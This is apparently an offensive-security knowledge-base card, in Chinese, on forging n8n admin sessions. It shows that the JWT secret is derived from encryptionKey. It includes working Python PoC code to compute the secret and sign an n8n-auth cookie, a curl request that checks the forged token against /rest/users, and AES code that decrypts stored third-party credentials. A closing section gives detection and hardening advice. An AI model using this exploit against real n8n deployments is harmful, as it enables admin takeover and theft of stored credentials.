---
id: web-nodejs-n8n-encryptionkey-jwt-forgery-admin-takeover
title: n8n encryptionKey 派生 JWT 密钥：读配置与数据库后伪造 admin 会话
type: scenario
domain: web
path: web/nodejs
technique: n8n-encryptionkey-derived-jwt-forgery
tags:
- n8n
- nodejs
- jwt
- encryption-key
- authentication-bypass
- token-forgery
- sqlite
- credentials
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V29
  verified_at: '2026-11-05T03:13:01+08:00'
  notes: 已通读原文并解码查看10张内嵌截图。核对：jwt_secret=sha256(encryptionKey 偶数位)、payload id+hash、hash=base64(sha256(email:password_hash))[:10]；图5 取到 admin id/email、图6 伪造 n8n-auth 访问 /rest/users 返回 HTTP 200、图7 可管理工作流数 9，admin 接管已证明。凭据 AES 解密原文自述环境无第三方凭证未演示，卡内已标边界。修正：PoC 中 encryption_key 为 bytes 却调用 .encode()，已改为对 bytes 切片直接 sha256，避免 AttributeError。未验证点：PoC 未执行；原文未给版本区间。frontmatter 无 sources/source_url。
url: /docs/web/nodejs/web-nodejs-n8n-encryptionkey-jwt-forgery-admin-takeover/
draft: false
kb_aliases:
- n8n JWT 伪造
- n8n encryptionKey 派生 jwt_secret
- n8n admin token 伪造
- n8n n8n-auth cookie 伪造
- n8n 配置泄露接管
---

## 一句话结论

n8n 的 JWT 签名密钥由 `$HOME/.n8n/config` 中的 `encryptionKey` 派生（取偶数位字符后 SHA-256）；攻击者一旦读到该配置和 `database.sqlite` 中 admin 的 `id/email/password`，即可离线计算 `jwt_secret` 并签发 `n8n-auth` Cookie，无需破解 bcrypt 密码就接管 admin 会话。

## 原理

- n8n 首次启动生成 32 字节 `encryptionKey` 写入 `$HOME/.n8n/config`，用于加密数据库中的第三方凭证；同时该 key 还参与 JWT 签名密钥的派生。
- 派生逻辑：
  ```python
  jwt_secret = hashlib.sha256(encryption_key[::2].encode()).hexdigest()
  ```
  等价于源码中取偶数下标字符再拼接：`key.split('').filter((_, i) => i % 2 === 0).join('')`。设计意图是让 JWT secret 不等于 encryptionKey，防止 JWT secret 泄露反推 encryptionKey；但攻击链方向相反——先拿到 encryptionKey，再推导 jwt_secret。
- JWT payload 不直接使用密码，而是使用由用户记录推导的短哈希：
  ```python
  raw = f"{email}:{password_hash}"
  jwt_hash = base64.b64encode(hashlib.sha256(raw.encode()).digest()).decode()[:10]
  payload = {"id": user_id, "hash": jwt_hash}
  token = jwt.encode(payload, jwt_secret, "HS256")
  ```
  `[:10]` 只取前 10 个 base64 字符（约 60 位熵），但足以让服务端校验通过；攻击者不需要知道明文密码或破解 bcrypt。
- 数据库 `user` 表（1.65.0 实际表名是 `user`，不是部分资料写的 `user_entity`）提供 `id`、`email`、`password`。
- 伪造 token 放入 Cookie `n8n-auth`，请求 `/rest/users` 返回 200 即说明会话有效。
- 同一把 `encryptionKey` 还可解密 `credentials_entity` 中的第三方凭证：
  ```python
  iv  = encryption_key[:16]
  key = hashlib.sha256(encryption_key).digest()
  plaintext = AES.new(key, AES.MODE_CBC, iv).decrypt(encrypted_data)
  ```

## 触发条件

- 攻击者已获得目标实例的 `encryptionKey` 与 `database.sqlite`（常见来源：n8n Form 任意文件读取、备份泄露、卷/容器文件访问）。
- 目标 `database.sqlite` 中存在 admin 用户记录（`id`、`email`、`password`）。
- 目标使用 SQLite 存储（默认自托管部署；使用 Postgres 时同理读 user 表）。
- 目标 JWT 派生逻辑与本文版本一致（原文验证 1.65.0；原文称该设计在最新版本仍存在）。
- 目标 Cookie 未强制 HTTPS 时可直接在 HTTP 上使用伪造 Cookie（`N8N_SECURE_COOKIE=false`）。

## 利用步骤

1. 读取 `$HOME/.n8n/config` 得到 `encryptionKey`。
2. 下载 `$HOME/.n8n/database.sqlite`，查询 `SELECT id, email, password FROM user LIMIT 1;` 取 admin 记录。
3. 计算 `jwt_secret = sha256(encryption_key[::2])`。
4. 计算 `hash = base64(sha256(f"{email}:{password_hash}"))[:10]`。
5. 用 HS256 签发 `{"id": user_id, "hash": hash}`，作为 `n8n-auth` Cookie 发送。
6. 请求 `/rest/users` 或任意 admin API 验证 200；随后可创建工作流、读取/写入凭证、执行表达式注入。
7. 如需第三方凭证，用 `encryptionKey` 按 AES-256-CBC（`iv=key[:16]`，`key=sha256(encryptionKey)`）解密 `credentials_entity`。

## PoC

```python
import base64, hashlib, jwt

encryption_key = b"kLZrxPFNWTeZlrCi7IvJ6SI+TLW3sN1d"  # bytes，便于下方 AES 使用
user_id = "6e1148e7-2d38-47e7-a3a9-1fdb1fc5406b"
email = "admin@exploit.local"
password_hash = "<从 database.sqlite 的 user.password 取出>"

jwt_secret = hashlib.sha256(encryption_key[::2]).hexdigest()  # bytes 切片后直接哈希
raw = f"{email}:{password_hash}"
jwt_hash = base64.b64encode(hashlib.sha256(raw.encode()).digest()).decode()[:10]
payload = {"id": user_id, "hash": jwt_hash}
token = jwt.encode(payload, jwt_secret, "HS256")
print(token)
```

```bash
curl -s http://target:5678/rest/users \
  -H "Cookie: n8n-auth=<伪造的 token>"
# 返回 200 即 admin 会话有效
```

凭据解密：

```python
from Crypto.Cipher import AES
iv = encryption_key[:16]
key = hashlib.sha256(encryption_key).digest()
plaintext = AES.new(key, AES.MODE_CBC, iv).decrypt(encrypted_data)
```

## 变体与关联

- 变体（数据源）：除 SQLite 外，Postgres 部署同样可从 user 表取 `id/email/password`；`encryptionKey` 也可能来自环境变量、备份、日志或容器卷。
- 变体（凭据利用）：解密 `credentials_entity` 后接管第三方服务（云 API、SMTP、Git、数据库等）；原文测试环境未配置第三方凭证，未演示实际解密。
- 变体（Cookie 传输）：`N8N_SECURE_COOKIE=false` 时可在 HTTP 上直接使用；强制 HTTPS 时需在同协议下发送。
- 关联：[[web-nodejs-n8n-form-content-type-confusion-file-read]]（获取 encryptionKey 与数据库的入口）。
- 关联：[[web-nodejs-n8n-expression-sandbox-escape-rce]]（取得 admin 后的代码执行）。
- 边界：拿不到数据库记录（无 admin 用户/表结构不同/加密存储）时无法完成 token 伪造；JWT 派生实现若变更，公式需重新确认。

## 检测与防御

- 加固：`encryptionKey` 与数据库文件不应被 Web 进程以外的路径读取；文件读取漏洞修复后仍需轮换 key（已泄露的 key 不会因升级自动失效）。
- 加固：JWT 签名密钥使用独立的、与 encryptionKey 无关的强随机密钥，并支持轮换；不要从可读配置文件派生。
- 加固：数据库文件权限最小化，避免与 Web 根/挂载卷同目录；备份加密。
- 检测：`n8n-auth` Cookie 的 JWT 签发时间/来源异常；同一 `id` 在短时间内从多个 IP 使用；`/rest/users`、`/rest/workflows` 的异常访问。
- 检测：读取 `config`、`database.sqlite` 的异常请求（衔接文件读取入口）；`user` 表或凭证表被批量导出。
- 事后：立即轮换 `encryptionKey`、重置 admin 密码、轮换所有第三方凭证，并审计历史登录/操作日志。
